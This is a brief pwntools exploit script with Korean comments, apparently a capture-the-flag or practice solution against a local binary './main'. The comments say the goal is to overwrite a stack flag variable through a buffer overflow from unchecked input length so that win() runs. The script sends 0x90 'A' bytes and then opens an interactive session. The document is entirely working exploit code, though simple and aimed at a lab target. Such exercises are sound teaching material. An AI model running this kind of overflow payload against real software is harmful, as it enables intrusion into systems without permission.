from pwn import *

p=process('./main')

#Goal
#오버플로우로 스택의 flag 변수를 0이 아닌 값으로 덮어 win()을 실행

#Vulnerability
#길이 검증 없이 과다 입력을 받아 발생하는 스택 버퍼 오버플로우

#Exploitation

payload=b'A'*0x90

p.send(payload)

p.interactive()
